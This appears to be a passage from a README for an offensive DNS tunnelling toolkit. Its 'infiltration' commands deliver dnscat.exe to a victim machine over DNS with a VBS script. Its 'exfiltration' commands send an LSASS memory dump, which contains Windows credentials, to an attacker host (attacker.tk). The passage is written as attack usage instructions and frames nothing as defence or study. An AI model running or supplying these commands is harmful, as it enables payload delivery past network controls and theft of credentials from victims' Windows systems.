Correct `yourzone.tk`.

### infiltration
Change loops count in `dns_download.vbs` before running.
```
attacker> sudo ./dns_upload.py --udp --file dnscat.exe
victim> cscript.exe dns_download.vbs
```

### exfiltration
```
attacker> sudo ./dns_download.py --udp --file lsass.mdmp
victim> cscript.exe dns_upload.vbs c:\path\to\lsass.mdmp attacker.tk
```
